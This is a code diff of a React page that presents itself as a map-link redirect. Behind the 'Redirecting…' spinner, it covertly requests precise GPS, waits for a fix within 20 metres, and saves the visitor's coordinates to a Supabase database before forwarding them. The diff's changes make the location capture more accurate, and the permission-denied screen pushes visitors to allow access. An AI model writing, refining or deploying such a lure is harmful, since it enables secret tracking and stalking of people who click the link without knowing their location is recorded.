@@ -1,79 +1,83 @@
-// src/App.jsx
 import { useState, useEffect } from "react";
 import { supabase } from "./supabase";
 import "./App.css";
 
 function App() {
-  const [status, setStatus] = useState("requesting"); // 'requesting', 'denied', 'success'
+  // 'requesting', 'denied', 'success'
+  const [status, setStatus] = useState("requesting");
+
+  // how precise we need the fix (in meters)
+  const DESIRED_ACCURACY = 20;
 
   useEffect(() => {
-    // Check if geolocation is supported
     if (!navigator.geolocation) {
-      console.error("Geolocation is not supported by your browser");
+      console.error("Geolocation is not supported");
       redirectToLocation();
       return;
     }
-
-    // Request location permission immediately
-    requestLocation();
+    startWatching();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  const requestLocation = () => {
+  const startWatching = () => {
     setStatus("requesting");
 
-    // Request precise location with high accuracy
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const { latitude, longitude } = position.coords;
+    const options = {
+      enableHighAccuracy: true, // ask for GPS
+      maximumAge: 0,            // no cached positions
+      timeout: 20000,           // give it up to 20s
+    };
 
-        try {
-          // Save location to Supabase
-          const { error } = await supabase.from("locations").insert([
-            {
-              latitude,
-              longitude,
-              timestamp: new Date().toISOString(),
-            },
-          ]);
+    const watchId = navigator.geolocation.watchPosition(
+      async (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        console.log(`Update: accuracy=${accuracy}m`);
 
-          if (error) {
-            console.error("Error saving location:", error);
-          }
-
-          setStatus("success");
-          // Redirect after successful location access
-          redirectToLocation();
-        } catch (err) {
-          console.error("Error saving location:", err);
-          setStatus("success");
-          // Redirect anyway even if there was an error saving
-          redirectToLocation();
+        if (accuracy <= DESIRED_ACCURACY) {
+          // Got a good GPS lock—stop watching and proceed
+          navigator.geolocation.clearWatch(watchId);
+          await saveAndRedirect(latitude, longitude);
+        } else {
+          // Still waiting for better precision
+          // (Optionally, you could show a UI hint if accuracy stays poor)
         }
       },
       (err) => {
         console.error("Geolocation error:", err);
+        navigator.geolocation.clearWatch(watchId);
 
         if (err.code === 1) {
-          // PERMISSION_DENIED
+          // User denied permission
           setStatus("denied");
-          // Don't redirect - we'll show a message asking them to enable location
         } else {
-          // For other errors (POSITION_UNAVAILABLE, TIMEOUT), still redirect
+          // Other errors (timeout, unavailable)
           redirectToLocation();
         }
       },
-      {
-        enableHighAccuracy: true, // Request high accuracy for precise location
-        timeout: 10000, // 10 seconds timeout
-        maximumAge: 0, // Don't use cached position
-      }
+      options
     );
   };
 
+  const saveAndRedirect = async (latitude, longitude) => {
+    try {
+      const { error } = await supabase.from("locations").insert([
+        {
+          latitude,
+          longitude,
+          timestamp: new Date().toISOString(),
+        },
+      ]);
+      if (error) console.error("Supabase insert error:", error);
+    } catch (e) {
+      console.error("Unexpected error saving location:", e);
+    }
+
+    setStatus("success");
+    redirectToLocation();
+  };
+
   const redirectToLocation = () => {
-    // Redirect to the specific location
     const specificLocationUrl = "https://maps.app.goo.gl/TSZQucADCqHnj5odA";
-    // Short delay to ensure any UI transitions are complete
     setTimeout(() => {
       window.location.href = specificLocationUrl;
     }, 1500);
@@ -81,12 +85,19 @@ function App() {
 
   return (
     <div className="loader-container">
-      {status === "requesting" || status === "success" ? (
+      {(status === "requesting" || status === "success") && (
         <>
           <div className="loader"></div>
-          <h2 className="redirecting-text">Redirecting...</h2>
+          <h2 className="redirecting-text">Redirecting…</h2>
+          {/* Optional Android hint */}
+          <p className="accuracy-hint">
+            If location seems off on Android, switch your Location Mode to
+            “High accuracy” in Settings → Location.
+          </p>
         </>
-      ) : status === "denied" ? (
+      )}
+
+      {status === "denied" && (
         <div className="location-denied">
           <div className="location-icon">📍</div>
           <h2>Location Access Required</h2>
@@ -95,11 +106,11 @@ function App() {
             Please enable location services in your browser settings and try
             again.
           </p>
-          <button className="retry-button" onClick={requestLocation}>
+          <button className="retry-button" onClick={startWatching}>
             Enable Location Access
           </button>
         </div>
-      ) : null}
+      )}
     </div>
   );
 }
